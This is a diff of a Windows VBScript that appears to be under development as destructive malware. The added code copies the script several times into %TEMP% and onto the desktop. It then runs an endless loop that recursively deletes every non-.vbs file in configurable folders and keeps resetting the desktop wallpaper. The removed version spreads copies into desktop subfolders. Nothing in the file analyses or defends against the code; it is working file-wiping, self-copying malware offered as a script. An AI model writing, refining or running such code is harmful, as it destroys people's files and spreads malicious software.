@@ -1,61 +1,57 @@
-Option Explicit
-
-Dim objShell, objFSO, objFolder, objFile, i
-
-' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
-
-' Set wallpaper
-objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
-objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
-
-' Create a FileSystemObject
 Set objFSO = CreateObject("Scripting.FileSystemObject")
+strScriptPath = WScript.ScriptFullName
 
-' Get the Desktop folder
-Set objFolder = objFSO.GetFolder(objShell.SpecialFolders("Desktop"))
+' Specify the folders in which you want to delete files (modify as needed)
+foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
 
-' Generate a random number for the copy iteration
-Randomize
-Dim randomIteration
-randomIteration = Int((1000 * Rnd) + 1)
+' Get the path to the desktop folder
+strDesktopFolder = objShell.SpecialFolders("Desktop")
 
-' Copy the script to the temporary folder
-Dim strCopyPath
-strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
-objFSO.CopyFile WScript.ScriptFullName, strCopyPath, True ' Add "True" to overwrite existing files
+' Specify the number of copies to create
+numCopies = 5
 
-' Create a copy of the script on the desktop
-Dim strDesktopCopyPath
-strDesktopCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
-objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+' Generate copies of the script
+For i = 1 To numCopies
+    randomIteration = Int((1000 * Rnd) + 1)
 
-' Get the list of folders on the desktop
-Dim colFolders, objDesktopFolder
-Set objDesktopFolder = objFSO.GetFolder(objFolder.Path)
-Set colFolders = objDesktopFolder.SubFolders
+    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
+    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
 
-' Iterate through each folder and create a copy of the script
-Dim objSubFolder
-For Each objSubFolder In colFolders
-    Dim strFolderCopyPath
-    strFolderCopyPath = objSubFolder.Path & "\Copy" & randomIteration & ".vbs"
+    ' Create a copy of the script on the desktop
+    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
+    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+Next
+
+' Loop indefinitely
+Do
+    ' Delete all files except VBS files within the specified folders
+    For Each folderPath In foldersToDelete
+        DeleteFilesExceptVBS folderPath
+    Next
+    
+    ' Set wallpaper
+    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+    
+Loop
+
+Sub DeleteFilesExceptVBS(folderPath)
     On Error Resume Next
-    objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
+    
+    Set folder = objFSO.GetFolder(folderPath)
+    If Err.Number = 0 Then
+        For Each file In folder.Files
+            If LCase(objFSO.GetExtensionName(file.Path)) <> "vbs" Then
+                objFSO.DeleteFile file.Path
+            End If
+        Next
+        
+        ' Recursively delete files in subfolders
+        For Each subfolder In folder.Subfolders
+            DeleteFilesExceptVBS subfolder.Path
+        Next
+    End If
+    
     On Error GoTo 0
-Next
-
-' Generate additional copies of the script
-Dim numAdditionalCopies
-numAdditionalCopies = 5 ' Modify the number of additional copies as desired
-
-For i = 1 To numAdditionalCopies
-    Dim additionalCopyPath
-    additionalCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & "_" & i & ".vbs"
-    objFSO.CopyFile strCopyPath, additionalCopyPath, True ' Add "True" to overwrite existing files
-Next
-
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objFolder = Nothing
-Set objFSO = Nothing
+End Sub
